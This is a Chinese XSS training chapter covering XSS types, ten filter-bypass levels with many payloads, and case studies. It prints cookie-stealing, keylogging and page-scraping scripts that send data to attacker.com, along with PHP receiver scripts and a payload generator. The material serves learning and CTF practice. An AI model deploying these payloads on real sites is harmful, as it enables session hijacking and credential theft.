---
outline: deep
---

# 靶场3：XSS Challenges 跨站脚本专项靶场

> **难度等级：🟡 中等**
>
> **预计学习时间：120分钟**

---

## 📖 本章概述

::: tip 本章内容
XSS Challenges是一个专注于跨站脚本攻击（XSS）练习的在线靶场，包含多个难度递进的关卡，涵盖了各种XSS绕过技巧。本章将带你系统学习XSS的三种类型、各种绕过方法，以及XSS平台的使用，通过10个经典关卡的详细解析，掌握XSS的核心利用技巧。
:::

> 💡 **大白话说XSS Challenges——学会在网页里"塞代码"**
>
> XSS的本质特别简单：**在一个网站里插入一段你自己的JavaScript代码，让别人的浏览器执行。**
>
> 就像你在别人的广告牌上贴了一张自己的海报——路过的人都看到了你的海报（执行了你的JS），然后Cookie就被送到了你手里。
>
> XSS的难点不在于"插进去"，而在于绕过各种**过滤**：
> - 网站说"不允许有 `<script>` 标签" → 你用 `<img onerror=...>` 绕过
> - 网站说"过滤了尖括号" → 你用编码绕过
> - 网站说"所有特殊字符都过滤" → 你可能需要找别的方法
>
> 这就是XSS Challenges要训练你的：**在越来越严格的过滤条件下，依然能把JavaScript塞进去并执行。**

---

## 🎯 学习目标

学完本章，你将能够：

- [ ] 了解XSS Challenges靶场的特点和使用方法
- [ ] 掌握XSS的三种类型及其区别
- [ ] 熟练运用各种XSS绕过技巧
- [ ] 能够通关常见的XSS挑战关卡
- [ ] 了解XSS平台的功能和使用
- [ ] 掌握Cookie窃取、键盘记录等XSS利用方式
- [ ] 理解XSS的防御方法

---

## 🔍 正文内容

### 1. XSS Challenges介绍

#### 1.1 什么是XSS Challenges？

**XSS Challenges** 是一系列专门用于练习XSS（跨站脚本攻击）的在线挑战平台。它通过模拟真实场景中的各种过滤和防护机制，帮助学习者掌握XSS的各种绕过技巧。

**常见的XSS Challenges平台**：
- **XSS Game**（Google出品）：https://xss-game.appspot.com/
- **Prompt.ml**：https://prompt.ml/
- **XSS Challenges**（日本）：https://xss-quiz.int21h.jp/
- **alert(1) to win**：https://alf.nu/alert1
- **Hack The Box XSS Challenges**
- **BUUCTF / CTFHub** 中的XSS题目

#### 1.2 靶场特点

| 特点 | 说明 |
|------|------|
| **专注XSS** | 只练习XSS一种漏洞，深度足够 |
| **难度递进** | 从简单到困难，循序渐进 |
| **场景丰富** | 涵盖各种过滤和编码场景 |
| **即时反馈** | 提交Payload立即知道是否成功 |
| **在线练习** | 不需要本地搭建环境，打开浏览器即可 |
| **社区活跃** | 有大量Writeup和讨论可以参考 |

#### 1.3 适用人群

- 想要系统学习XSS的安全爱好者
- CTF选手（Web方向）
- 前端开发者（学习XSS防御）
- 渗透测试工程师
- 已经学过DVWA的XSS模块，想要深入的学习者

---

### 2. 环境搭建

#### 2.1 在线平台（最推荐）

直接访问在线平台即可开始练习，无需任何搭建：

| 平台名称 | 地址 | 特点 |
|---------|------|------|
| Google XSS Game | https://xss-game.appspot.com/ | Google官方出品，6个关卡，新手友好 |
| prompt.ml | https://prompt.ml/ | 12个关卡，难度适中 |
| XSS Quiz | https://xss-quiz.int21h.jp/ | 日本的XSS挑战，15关 |
| alert(1) to win | https://alf.nu/alert1 | 难度较高，适合进阶 |
| XSS Challenges by cure53 | https://xss.cure53.de/ | 德国安全公司出品 |

#### 2.2 本地部署

如果在线平台访问慢或无法访问，可以本地部署：

```bash
# 以Google XSS Game为例
git clone https://github.com/GoogleCloudPlatform/securityscorecard.git
# 或使用Docker
docker search xss-game
```

---

### 3. XSS类型回顾

#### 3.1 反射型XSS（Reflected XSS）

**原理**：恶意脚本通过URL参数传递，服务器将其反射到页面中执行。

**特点**：
- 非持久性，只在当前请求中生效
- 需要诱导用户点击恶意链接
- 常见于搜索、错误提示、参数回显等功能

**示例场景**：
```
http://target.com/search?q=<script>alert(1)</script>
```
服务器将用户输入的q参数直接输出到页面，导致脚本执行。

#### 3.2 存储型XSS（Stored XSS）

**原理**：恶意脚本被存储在服务器端（数据库、文件等），当其他用户访问包含恶意脚本的页面时，脚本自动执行。

**特点**：
- 持久性，存储在服务器端
- 不需要诱导用户点击特定链接
- 危害更大，影响所有访问该页面的用户
- 常见于留言板、评论、用户资料、文章发布等功能

**示例场景**：
- 用户在留言板提交恶意脚本
- 脚本存储到数据库
- 所有查看留言板的用户都会执行该脚本

#### 3.3 DOM型XSS（DOM-based XSS）

**原理**：恶意脚本通过修改页面的DOM结构来执行，完全发生在客户端，不经过服务器处理。

**特点**：
- 不与服务器交互，纯前端问题
- 由JavaScript直接操作DOM导致
- 更难检测和防御
- 常见于URL hash、前端路由、本地存储等

**示例场景**：
```javascript
// 前端代码
var name = location.hash.slice(1);
document.getElementById('output').innerHTML = name;
```
访问 `http://target.com/#<img src=x onerror=alert(1)>` 时，脚本在前端执行。

#### 3.4 三种XSS对比

| 对比项 | 反射型 | 存储型 | DOM型 |
|-------|-------|-------|-------|
| 存储位置 | URL参数 | 服务器（数据库/文件） | 前端（URL/DOM） |
| 持久性 | 一次性 | 持久存储 | 一次性 |
| 交互方式 | 需要点击链接 | 访问页面即可 | 需要特定URL |
| 服务器参与 | 有 | 有 | 无 |
| 危害程度 | 中等 | 高 | 中高 |
| 检测难度 | 简单 | 中等 | 困难 |
| 典型场景 | 搜索、错误页 | 留言板、评论 | 前端路由、hash |

> 💡 **大白话说三种XSS——用"便利店"来理解**
>
> 同一个便利店（同一个网站），三种不同的攻击方式：
>
> **反射型XSS**：你在收银台贴了张纸条——"恭喜中奖！点击领取"。店员（网站服务器）看到纸条后直接念给下一位顾客听。只有看到纸条的顾客中招。就像钓鱼链接——你发给谁，谁点谁遭殃。
> - 适用场景：钓鱼攻击。发个带恶意脚本的链接给你的目标。
>
> **存储型XSS**：你不是贴纸条在收银台，而是直接写在店里的**公告板上**。从此以后，每位进店的顾客都能看到你的恶意内容。不需要任何人点链接，只要访问这个页面就自动中招。
> - 适用场景：留言板、评论系统、个人资料页——任何"用户输入内容，然后展示给其他用户"的地方。
>
> **DOM型XSS**：最隐蔽的一种。你不是修改"服务器返回的内容"，而是修改了"浏览器自己渲染页面时的逻辑"。就像便利店的价签系统有个Bug——你往商品编号里塞了段代码，价签系统就把代码当成了价格显示的指令去执行。
> - 关键区别：服务器日志里**完全看不出攻击**，因为恶意代码根本没经过服务器，全部在受害者浏览器里完成。
>
> **面试中经常被问的坑**：DOM型XSS为什么比存储型难检测？因为它的Payload不在服务器响应体里，传统WAF扫描不到。必须靠浏览器端的动态检测。

---

### 4. 各关卡通关思路

以下以Google XSS Game和常见XSS Challenges为例，讲解10个经典关卡的通关思路。

#### 4.1 关卡1：基础XSS

**场景**：一个搜索页面，搜索关键词会回显在页面上。

**防护**：无任何过滤。

**通关思路**：

这是最基础的XSS，直接注入script标签即可。

**Payload**：
```html
<script>alert('xss')</script>
```

**原理说明**：
- 用户输入直接拼接到HTML中
- 浏览器解析到script标签时执行其中的JavaScript代码
- 这是最基础也是最容易被防护的XSS形式

**其他可用Payload**：
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
```

---

#### 4.2 关卡2：过滤script标签

**场景**：同样是搜索回显，但过滤了script标签。

**防护**：将 `<script>` 替换为空或进行转义。

**通关思路**：

当script标签被过滤时，可以使用其他能够执行JavaScript的HTML标签和事件。

**Payload**：
```html
<!-- 使用img标签的onerror事件 -->
<img src=x onerror=alert(1)>

<!-- 使用svg标签的onload事件 -->
<svg onload=alert(1)>

<!-- 使用body标签的onload事件 -->
<body onload=alert(1)>

<!-- 使用input标签的autofocus+onfocus -->
<input autofocus onfocus=alert(1)>

<!-- 使用details标签 -->
<details open ontoggle=alert(1)>

<!-- 使用video标签 -->
<video src=x onerror=alert(1)>

<!-- 使用audio标签 -->
<audio src=x onerror=alert(1)>
```

**原理说明**：
- HTML中有大量的事件处理器（event handler）
- 这些事件在特定条件下会触发执行JavaScript
- 常见的事件：onload、onerror、onfocus、onclick等
- 只过滤script标签是远远不够的

---

#### 4.3 关卡3：过滤引号

**场景**：输入被放在HTML标签的属性值中，且引号被过滤或转义。

**防护**：过滤单引号和双引号。

**示例代码**：
```html
<input type="text" value="用户输入">
```

**通关思路**：

当引号被过滤时，可以通过闭合标签的方式跳出属性值，或者使用不需要引号的属性。

**Payload**：
```html
<!-- 闭合标签 -->
"><script>alert(1)</script>

<!-- 闭合input，注入img标签 -->
"><img src=x onerror=alert(1)>

<!-- 不闭合标签，使用事件 -->
" onmouseover=alert(1) x="

<!-- 使用autofocus+onfocus -->
" autofocus onfocus=alert(1) x="

<!-- 使用style属性 -->
" style="animation:rotation 1s infinite" onanimationend=alert(1) x="
```

**进阶 - 无引号的情况**：

如果输入在属性值中但没有引号包裹：
```html
<input value=用户输入>
```
可以直接注入事件属性：
```html
onmouseover=alert(1)
```

**原理说明**：
- HTML属性值可以用单引号、双引号包裹，也可以不用引号
- 通过闭合前面的标签或属性，可以注入新的属性或标签
- 事件属性不需要引号包裹JavaScript代码

---

#### 4.4 关卡4：过滤空格

**场景**：空格被过滤或替换。

**防护**：删除或转义空格字符。

**通关思路**：

空格被过滤时，可以使用其他字符代替空格，或者使用不需要空格的语法。

**Payload**：
```html
<!-- 使用斜杠代替空格 -->
<img/src=x onerror=alert(1)>

<!-- 使用制表符 -->
<img	src=x	onerror=alert(1)>

<!-- 使用换行符 -->
<img
src=x
onerror=alert(1)>

<!-- 使用注释 -->
<img<!-- -->src=x<!-- -->onerror=alert(1)>

<!-- 使用斜杠闭合 -->
<svg/onload=alert(1)>

<!-- 不使用空格的事件注入 -->
"onmouseover=alert(1)x="

<!-- 使用NULL字节（某些环境） -->
<img%00src=x%00onerror=alert(1)>
```

**原理说明**：
- HTML解析器对空格的定义比较宽松
- 制表符（%09）、换行符（%0a）、回车符（%0d）等都可以作为分隔符
- 斜杠（/）在某些情况下也可以代替空格
- HTML注释（<!-- -->）会被解析器忽略，可以用来分隔属性

---

#### 4.5 关卡5：HTML实体编码

**场景**：用户输入被HTML实体编码后输出。

**防护**：使用htmlspecialchars或类似函数对输出进行编码。

**HTML实体编码示例**：
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `&` → `&amp;`

**通关思路**：

HTML实体编码在大多数情况下可以防御XSS，但如果输出位置特殊（如script标签内、事件属性中），仍然可能被绕过。

**场景1：输出在script标签中**
```html
<script>
var name = "用户输入";
</script>
```
可以闭合引号和script标签：
```html
";alert(1);//
</script><script>alert(1)</script>
```

**场景2：输出在JavaScript字符串中**
```html
<script>
var input = '用户输入';
document.write(input);
</script>
```
可以使用Unicode转义或十六进制转义：
```javascript
'\\u003cimg src=x onerror=alert(1)\\u003e'
```

**场景3：输出在href/src等属性中**
```html
<a href="用户输入">点击</a>
```
可以使用javascript伪协议：
```html
javascript:alert(1)
```

**原理说明**：
- HTML实体编码只在HTML上下文中有效
- 如果输出在JavaScript代码中，需要考虑JS的编码方式
- 不同的上下文需要不同的编码方式
- 单一的HTML实体编码不能防御所有XSS场景

---

#### 4.6 关卡6：JavaScript编码

**场景**：输入输出在JavaScript代码中，且进行了某种编码或过滤。

**防护**：对特殊字符进行JavaScript转义。

**通关思路**：

利用JavaScript的各种编码和语法特性来绕过过滤。

**Payload**：
```javascript
// 使用eval和字符串拼接
eval('al' + 'ert(1)')

// 使用Unicode编码
\u0061lert(1)  // \u0061 = 'a'

// 使用十六进制
\x61lert(1)  // \x61 = 'a'

// 使用八进制
\141lert(1)  // \141 = 'a'

// 使用constructor
'alert(1)'.constructor.constructor('alert(1)')()

// 使用window对象
window['alert'](1)

// 使用setTimeout
setTimeout('alert(1)', 0)

// 使用location和javascript
location='javascript:alert(1)'

// 使用fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)
```

**进阶 - 没有字母数字的XSS**：
```javascript
// 使用[]和!构造JS代码
// 原理：利用JS的类型转换特性
[![]+[]][+[]][++[[]][+[]]+[+[]]] // 'a' （原理较复杂）
```

**原理说明**：
- JavaScript支持多种字符编码方式
- 可以通过字符串拼接、数组访问等方式构造任意代码
- constructor、prototype等特性可以用来执行代码
- JS的隐式类型转换可以产生各种意想不到的结果

---

#### 4.7 关卡7：URL编码绕过

**场景**：URL参数会被URL解码，然后输出到页面。

**防护**：对某些关键字进行过滤，但URL解码发生在过滤之前或之后。

**通关思路**：

利用URL编码、双重编码、混合编码等方式绕过关键字过滤。

**Payload**：
```html
<!-- URL编码 -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- 双重URL编码 -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- 部分编码 -->
<scr%69pt>alert(1)</script>

<!-- Unicode编码 -->
<\u0073cript>alert(1)</script>

<!-- HTML实体编码（在HTML上下文中） -->
&lt;script&gt;alert(1)&lt;/script&gt;
（注意：这通常不会执行，除非有二次渲染）

<!-- 混合编码 -->
<%00script>alert(1)</script>
```

**绕过WAF的URL编码技巧**：
```
%09  → 制表符（TAB）
%0a  → 换行符
%0d  → 回车符
%00  → NULL字节
%20  → 空格
%2b  → +号
```

**原理说明**：
- URL会经过多层解码
- 如果过滤和解码的顺序不正确，就可以被绕过
- 双重编码是常见的绕过方式
- 不同的Web服务器和编程语言可能有不同的解码行为

---

#### 4.8 关卡8：DOM型XSS

**场景**：输入通过前端JavaScript处理后插入到DOM中。

**防护**：服务器端可能做了过滤，但前端直接使用输入。

**常见的DOM XSS sinks**：
- `innerHTML`
- `document.write()`
- `outerHTML`
- `insertAdjacentHTML`
- `eval()`
- `setTimeout()` / `setInterval()`
- `location.href` / `location.hash`
- `window.name`
- `postMessage`

**通关思路**：

分析前端JavaScript代码，找到输入源（source）和输出点（sink），构造合适的Payload。

**示例场景1：innerHTML**
```javascript
var name = location.hash.slice(1);
document.getElementById('output').innerHTML = name;
```
Payload：
```
#<img src=x onerror=alert(1)>
```

**示例场景2：document.write**
```javascript
document.write("<h1>Hello " + location.search.split('=')[1] + "</h1>");
```
Payload：
```
?name=<script>alert(1)</script>
```

**示例场景3：jQuery的html()方法**
```javascript
$('#output').html(getQueryParam('name'));
```
Payload：
```
?name=<img src=x onerror=alert(1)>
```

**示例场景4：eval**
```javascript
eval("var name = '" + location.hash.slice(1) + "'");
```
Payload：
```
#';alert(1);//
```

**原理说明**：
- DOM XSS完全发生在客户端，不经过服务器
- 需要分析前端JS代码来找到漏洞
- 常见的source：location、document.referrer、window.name、postMessage
- 常见的sink：innerHTML、eval、document.write、setTimeout

---

#### 4.9 关卡9：事件注入

**场景**：输入被插入到事件处理器中。

**防护**：过滤了尖括号等HTML标签字符，但事件中的内容可控。

**示例代码**：
```html
<button onclick="greet('用户输入')">点击</button>
```

**通关思路**：

在事件处理器中，可以通过闭合引号和括号来注入新的JavaScript代码。

**Payload**：
```javascript
// 闭合单引号和括号
');alert(1);//

// 最终效果：
// <button onclick="greet('');alert(1);//')">点击</button>

// 其他变体
');alert(1);('

// 使用HTML实体绕过（在HTML属性中）
&apos;);alert(1);//

// 使用编码
&#39;);alert(1);//
```

**进阶 - 各种事件场景**：

场景1：onerror事件
```html
<img src="x" onerror="showError('用户输入')">
```
Payload：
```javascript
');alert(1);//
```

场景2：onmouseover事件
```html
<div onmouseover="highlight(this, '用户输入')">...</div>
```
Payload：
```javascript
');alert(1);//
```

场景3：href中的javascript
```html
<a href="javascript:greet('用户输入')">点击</a>
```
Payload：
```javascript
');alert(1);//
```

**原理说明**：
- 事件属性中的值会被当作JavaScript代码执行
- 如果可以控制事件中的部分内容，就可以注入代码
- 需要正确闭合引号、括号等语法结构
- HTML实体在属性中会被解码，所以可以用实体绕过引号过滤

---

#### 4.10 关卡10：链接注入

**场景**：用户可以提交链接，网站生成可点击的链接。

**防护**：验证链接格式，但验证不严格。

**示例代码**：
```html
<a href="用户提交的URL">访问链接</a>
```

**通关思路**：

使用javascript伪协议、data URI等方式执行脚本。

**Payload**：
```html
<!-- javascript伪协议 -->
javascript:alert(1)

<!-- 带编码的javascript -->
JavaScript:alert(1)
jAvAsCrIpT:alert(1)
java%0ascript:alert(1)

<!-- data URI -->
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

<!-- vbscript（IE浏览器） -->
vbscript:msgbox(1)

<!-- 利用//绕过检查 -->
//javascript:alert(1)

<!-- 利用?绕过 -->
?javascript:alert(1)

<!-- 利用\绕过 -->
\javascript:alert(1)
```

**进阶 - 绕过白名单检查**：

如果只允许http/https开头的链接：
```javascript
// 利用@符号
http://example.com@javascript:alert(1)
// （注意：这在现代浏览器中可能不生效）

// 利用协议相对URL
//example.com （如果example.com有XSS）

// 利用跳转
http://example.com/redirect?url=javascript:alert(1)
```

**原理说明**：
- href/src等属性支持多种协议
- javascript:伪协议可以直接执行JS代码
- data: URI可以直接渲染HTML内容
- URL的解析规则有很多可以利用的特性
- 不同浏览器的行为可能不同

---

### 5. XSS绕过技巧总结

#### 5.1 标签绕过

| 过滤方式 | 绕过方法 | 示例 |
|---------|---------|------|
| 过滤script | 使用其他标签 | `<img onerror=alert(1)>` |
| 过滤on事件 | 使用伪协议 | `javascript:alert(1)` |
| 过滤尖括号 | 注入属性 | `" onmouseover=alert(1) x="` |
| 大小写过滤 | 混合大小写 | `<ScRiPt>alert(1)</ScRiPt>` |
| 关键字过滤 | 拼接/编码 | `eval('al'+'ert(1)')` |

#### 5.2 编码绕过

| 编码类型 | 示例 | 说明 |
|---------|------|------|
| URL编码 | `%3Cscript%3E` | 最基础的编码 |
| 双重URL编码 | `%253Cscript%253E` | 绕过一次解码 |
| Unicode编码 | `\u003cimg\u003e` | JS上下文中 |
| HTML实体 | `&lt;img&gt;` | HTML属性中 |
| 十六进制 | `\x3cimg\x3e` | JS字符串中 |
| Base64 | `PHNjcmlwdD4=` | data URI中 |

#### 5.3 事件绕过

常用的事件处理器（按触发时机分类）：

**自动触发**：
- `onload`：页面/图片加载完成
- `onerror`：加载失败时
- `onfocus`：获得焦点时（配合autofocus）
- `onanimationend`：CSS动画结束时
- `ontoggle`：details标签切换时

**交互触发**：
- `onclick`：点击时
- `onmouseover`：鼠标悬停时
- `onmouseout`：鼠标离开时
- `onkeydown`：按键时
- `onsubmit`：表单提交时

#### 5.4 特殊场景绕过

**场景1：输出在script标签中**
```javascript
// 闭合方式
var name = "输入";
// Payload：";alert(1);//
```

**场景2：输出在注释中**
```html
<!-- 用户输入 -->
<!-- Payload： --><script>alert(1)</script><!-- -->
```

**场景3：输出在CSS中**
```css
<style>
.username { color: 输入; }
</style>
<!-- Payload：red; background: url(javascript:alert(1)) -->
<!-- 现代浏览器已大部分修复 -->
```

**场景4：输出在title标签中**
```html
<title>输入</title>
<!-- Payload：</title><script>alert(1)</script> -->
```

**场景5：输出在textarea中**
```html
<textarea>输入</textarea>
<!-- Payload：</textarea><script>alert(1)</script> -->
```

---

### 6. XSS平台使用介绍

#### 6.1 什么是XSS平台？

**XSS平台**是一种用于接收和管理XSS攻击结果的Web应用。当XSS Payload被触发时，会将受害者的信息（如Cookie、页面内容、键盘记录等）发送到XSS平台。

**常见XSS平台**：
- **xsser.me** / **xss.pt**：早期知名的XSS平台
- **BlueLotus_XSSReceiver**：蓝莲花战队的XSS接收平台
- **XSSPlatform**：开源XSS平台
- **xsshunter**：XSS Hunter平台
- 自己搭建的简易接收脚本

#### 6.2 XSS平台的主要功能

| 功能 | 说明 |
|------|------|
| **Cookie窃取** | 获取受害者的Cookie信息 |
| **页面抓取** | 获取受害者当前页面的HTML内容 |
| **键盘记录** | 记录受害者的键盘输入 |
| **截屏** | 截取受害者的页面截图（受限） |
| **内网探测** | 利用受害者浏览器探测内网 |
| **钓鱼劫持** | 弹出登录框等钓鱼内容 |
| **命令执行** | 执行任意JavaScript代码 |
| **会话劫持** | 利用Cookie登录受害者账号 |

#### 6.3 Cookie窃取

**原理**：通过XSS注入脚本，读取document.cookie并发送到攻击者服务器。

**基础Payload**：
```javascript
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

**隐蔽版本（不跳转页面）**：
```javascript
<script>
new Image().src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```

**接收端PHP脚本（steal.php）**：
```php
<?php
$cookie = $_GET['cookie'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$referer = $_SERVER['HTTP_REFERER'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

$log = "Time: $time\n";
$log .= "IP: $ip\n";
$log .= "Referer: $referer\n";
$log .= "User-Agent: $user_agent\n";
$log .= "Cookie: $cookie\n";
$log .= str_repeat('=', 50) . "\n";

file_put_contents('cookies.txt', $log, FILE_APPEND);

// 返回一个透明图片
header('Content-Type: image/png');
echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==');
?>
```

#### 6.4 键盘记录

**原理**：监听keydown/keypress事件，将按键记录发送到服务器。

**Payload**：
```javascript
<script>
(function(){
    var keys = '';
    document.onkeydown = function(e) {
        keys += e.key;
        // 每输入20个字符发送一次
        if (keys.length > 20) {
            new Image().src = 'http://attacker.com/keylog.php?k=' + encodeURIComponent(keys);
            keys = '';
        }
    };
    // 页面关闭时发送剩余记录
    window.onbeforeunload = function() {
        if (keys.length > 0) {
            navigator.sendBeacon('http://attacker.com/keylog.php?k=' + encodeURIComponent(keys));
        }
    };
})();
</script>
```

#### 6.5 页面抓取

**原理**：读取当前页面的HTML内容，发送到服务器。

**Payload**：
```javascript
<script>
var page = document.documentElement.outerHTML;
var url = location.href;
var data = new FormData();
data.append('url', url);
data.append('html', page);

fetch('http://attacker.com/sniff.php', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
</script>
```

#### 6.6 内网探测

**原理**：利用受害者的浏览器作为代理，探测其内网中的服务。

**Payload**：
```javascript
<script>
// 探测常见的内网IP和端口
var targets = [
    'http://192.168.1.1/',
    'http://192.168.0.1/',
    'http://127.0.0.1:8080/',
    'http://10.0.0.1/'
];

targets.forEach(function(target) {
    var img = new Image();
    img.onload = function() {
        // 能加载图片说明目标存在
        new Image().src = 'http://attacker.com/probe.php?host=' + encodeURIComponent(target) + '&status=alive';
    };
    img.onerror = function() {
        // 也可能存在但没有图片
    };
    img.src = target + '/favicon.ico';
});
</script>
```

---

## 📚 案例讲解

### 案例1：反射型XSS通关实战

**场景**：你在测试一个搜索功能，发现搜索关键词会回显在页面上。

**目标**：成功执行XSS，获取弹窗。

**步骤**：

1. **基础测试**
   - 输入：`<script>alert(1)</script>`
   - 结果：没有弹窗，页面显示了搜索结果
   - 查看源码：发现 `<script>` 标签被过滤了

2. **分析过滤规则**
   - 输入：`<img src=x onerror=alert(1)>`
   - 结果：仍然没有弹窗
   - 查看源码：尖括号被转义了（&lt; 和 &gt;）

3. **寻找注入点**
   - 仔细观察页面，发现搜索框的value属性中显示了搜索词
   - 查看HTML：`<input type="text" value="搜索词">`
   - 输入在属性值中，且引号没有被完全转义

4. **构造Payload**
   ```html
   " onmouseover=alert(1) x="
   ```
   - 注入后的HTML：
   ```html
   <input type="text" value="" onmouseover=alert(1) x="">
   ```

5. **验证漏洞**
   - 将鼠标移动到输入框上
   - 成功弹窗！

6. **进阶利用**
   - 构造更隐蔽的Payload：
   ```html
   " autofocus onfocus=alert(document.cookie) x="
   ```
   - 页面加载时自动触发，显示当前Cookie

**总结**：XSS不仅可以通过标签注入，还可以通过属性注入。当输出在HTML属性中时，可以通过闭合引号注入事件属性。

---

### 案例2：存储型XSS利用实战

**场景**：一个论坛的留言板功能，用户可以发布留言。

**目标**：注入存储型XSS，窃取管理员Cookie。

**步骤**：

1. **测试XSS**
   - 在留言框输入：`<script>alert(1)</script>`
   - 提交后刷新页面，没有弹窗
   - 查看源码：script标签被过滤了

2. **尝试绕过**
   - 输入：`<img src=x onerror=alert(1)>`
   - 提交后刷新，成功弹窗！
   - 确认存在存储型XSS

3. **构造Cookie窃取Payload**
   ```html
   <img src=x onerror="document.location='http://attacker.com/steal.php?c='+document.cookie">
   ```
   - 提交后测试：页面跳转到攻击者服务器，成功获取自己的Cookie

4. **优化Payload（更隐蔽）**
   ```html
   <img src=x onerror="new Image().src='http://attacker.com/steal.php?c='+document.cookie" style="display:none">
   ```
   - 使用img加载方式，页面不会跳转
   - 设置display:none，不影响页面显示

5. **等待管理员访问**
   - 发布含有恶意Payload的留言
   - 管理员审核留言或查看留言板时触发XSS
   - 管理员的Cookie被发送到攻击者服务器

6. **Cookie利用**
   - 收到管理员的Cookie：`PHPSESSID=admin_session_id`
   - 使用浏览器插件修改自己的Cookie
   - 刷新页面，成功以管理员身份登录

7. **进一步渗透**
   - 进入管理员后台
   - 查看用户数据
   - 上传Webshell
   - 获取服务器权限

**总结**：存储型XSS是危害最大的XSS类型，因为它能影响所有访问用户。配合Cookie窃取，可以直接获取用户权限。

---

### 案例3：DOM XSS实战

**场景**：一个单页应用（SPA），URL的hash部分用来控制页面显示内容。

**目标**：找到并利用DOM型XSS。

**步骤**：

1. **发现可疑点**
   - 观察URL：`http://target.com/#/page/home`
   - 页面内容根据hash变化而变化
   - 怀疑是前端路由，可能存在DOM XSS

2. **分析前端代码**
   - 查看页面源码，找到关键JS代码：
   ```javascript
   function renderPage() {
       var page = location.hash.slice(2); // 去掉 #/
       var template = document.getElementById('template').innerHTML;
       template = template.replace('{{content}}', page);
       document.getElementById('content').innerHTML = template;
   }
   window.onhashchange = renderPage;
   ```
   - 发现使用了innerHTML，且内容来自hash

3. **构造Payload**
   ```
   http://target.com/#/page/<img src=x onerror=alert(1)>
   ```
   - 访问后，成功弹窗！

4. **验证DOM XSS**
   - 查看服务器日志：请求中不包含Payload（hash不会发送到服务器）
   - 确认是纯DOM型XSS，完全在客户端执行

5. **进阶利用**
   - 构造窃取Cookie的链接：
   ```
   http://target.com/#/page/<img src=x onerror="new Image().src='http://attacker.com/steal.php?c='+document.cookie">
   ```
   - 诱导用户点击这个链接
   - 用户Cookie被窃取

6. **绕过CSP（如果有）**
   - 如果有Content-Security-Policy限制
   - 尝试找页面上已有的JS函数来调用
   - 或利用JSONP端点绕过

**总结**：DOM型XSS不经过服务器，传统的服务端防护（如WAF）无法检测。需要通过代码审计来发现和防御。

---

### 案例4：XSS平台搭建与使用

**场景**：你发现了一个存储型XSS漏洞，需要搭建一个XSS平台来接收数据。

**目标**：搭建简易XSS接收平台，实现Cookie窃取和键盘记录。

**步骤**：

1. **准备服务器**
   - 准备一台公网服务器（或本地测试环境）
   - 安装PHP环境和Web服务器（Apache/Nginx）

2. **创建Cookie接收脚本（steal.php）**
   ```php
   <?php
   header('Access-Control-Allow-Origin: *');
   
   $cookie = $_GET['c'] ?? $_POST['c'] ?? '';
   $ip = $_SERVER['REMOTE_ADDR'];
   $time = date('Y-m-d H:i:s');
   $referer = $_SERVER['HTTP_REFERER'] ?? 'unknown';
   $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
   
   $log = "[{$time}] IP: {$ip}\n";
   $log .= "Referer: {$referer}\n";
   $log .= "User-Agent: {$ua}\n";
   $log .= "Cookie: {$cookie}\n";
   $log .= str_repeat('-', 60) . "\n";
   
   file_put_contents('logs/cookies.log', $log, FILE_APPEND);
   
   // 返回1x1透明GIF
   header('Content-Type: image/gif');
   echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
   ?>
   ```

3. **创建键盘记录脚本（keylog.php）**
   ```php
   <?php
   header('Access-Control-Allow-Origin: *');
   
   $keys = $_GET['k'] ?? $_POST['k'] ?? '';
   $ip = $_SERVER['REMOTE_ADDR'];
   $time = date('Y-m-d H:i:s');
   $referer = $_SERVER['HTTP_REFERER'] ?? 'unknown';
   
   $log = "[{$time}] IP: {$ip} | Referer: {$referer}\n";
   $log .= "Keys: {$keys}\n";
   $log .= str_repeat('-', 60) . "\n";
   
   file_put_contents('logs/keylog.log', $log, FILE_APPEND);
   
   header('Content-Type: image/gif');
   echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
   ?>
   ```

4. **创建页面抓取脚本（sniff.php）**
   ```php
   <?php
   header('Access-Control-Allow-Origin: *');
   
   $url = $_POST['url'] ?? '';
   $html = $_POST['html'] ?? '';
   $ip = $_SERVER['REMOTE_ADDR'];
   $time = date('Y-m-d H:i:s');
   
   $filename = 'logs/pages/' . md5($url . $ip . $time) . '.html';
   file_put_contents($filename, "<!-- URL: {$url} -->\n<!-- IP: {$ip} -->\n<!-- Time: {$time} -->\n" . $html);
   
   echo 'OK';
   ?>
   ```

5. **创建XSS Payload生成页面**
   ```php
   <?php
   $domain = 'http://your-server.com/xss';
   ?>
   <!DOCTYPE html>
   <html>
   <head><title>XSS Payload生成器</title></head>
   <body>
   <h2>Cookie窃取</h2>
   <textarea rows="3" cols="80"><img src=x onerror="new Image().src='<?php echo $domain; ?>/steal.php?c='+document.cookie"></textarea>
   
   <h2>键盘记录</h2>
   <textarea rows="6" cols="80"><script>document.onkeydown=function(e){var k=e.key;if(k.length==1){new Image().src='<?php echo $domain; ?>/keylog.php?k='+encodeURIComponent(k);}};</script></textarea>
   
   <h2>页面抓取</h2>
   <textarea rows="8" cols="80"><script>fetch('<?php echo $domain; ?>/sniff.php',{method:'POST',body:new FormData(Object.entries({url:location.href,html:document.documentElement.outerHTML}))});</script></textarea>
   </body>
   </html>
   ```

6. **测试使用**
   - 在XSS漏洞页面注入Cookie窃取Payload
   - 触发XSS后，查看logs/cookies.log文件
   - 确认成功获取到Cookie信息

**总结**：XSS平台是XSS攻击的重要辅助工具，可以帮助收集和管理攻击结果。学习XSS防御时也需要了解这些攻击手段。

